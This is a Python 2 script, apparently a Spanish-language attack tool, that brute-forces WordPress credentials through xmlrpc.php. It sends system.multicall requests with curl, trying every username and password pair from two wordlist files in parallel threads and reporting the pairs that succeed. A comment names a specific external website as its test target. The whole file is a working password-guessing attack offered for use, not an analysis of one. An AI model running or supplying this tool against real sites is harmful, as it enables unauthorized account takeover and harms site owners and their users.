#!/usr/bin/python
# -*- coding: utf-8 -*-

import threading
import commands
import os

def cls():
    os.system('cls' if os.name=='nt' else 'clear')
cls()

BLUE = '\033[94m'
RED = '\033[1;31m'
BOLD = '\033[1m'
GREEN = '\033[32m'
ENDC = '\033[0m'
userx=[]
passx=[]

#test: https://www.lidereseducativos.cl
host = raw_input(BLUE+"\n Ingrese Url [http://domain.com]: "+ENDC)
arch = "xmlrpc.php"

username = file("users.txt", "r")
password = file("pass.txt", "r")
for user in username:
	user = user.rstrip()
	userx.append(user)

for pwd in password:
	pwd = pwd.rstrip()
	passx.append(pwd)

print BLUE+"\n Iniciando Brute Force ...\n"+ENDC

def brutexmlrpc(u, p):
	curls=commands.getoutput('curl -Lkg --data "<methodCall><methodName>system.multicall</methodName><params><param><value><array><data><value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><array><data><value><string>'+u+'</string></value><value><string>'+p+'</string></value></data></array></value></data></array></value></member></struct></value></data></array></value></param></params></methodCall>" '+host+'/'+arch)
	if curls.find("<int>403</int>") != -1:
		print RED+" No Found - "+str(u)+":"+str(p)+ENDC
	elif curls.find("<int>404</int>") != -1:
		print BLUE+" No Found - "+str(u)+":"+str(p)+ENDC
	elif curls.find("<int>200</int>") != -1:
		print GREEN+" Found - "+str(u)+":"+str(p)+" ☠ ☠ ☠ ☠ ☠ ☠ ☠ ☠ ☠ ☠ ☠ ☠ ☠ ☠ ☠ ☠ ☠ ☠ ☠ ☠"+ENDC

for u in userx:
	for p in passx:
		threads = list()
		t = threading.Thread(target=brutexmlrpc, args=(u, p))
		threads.append(t)
		t.start()
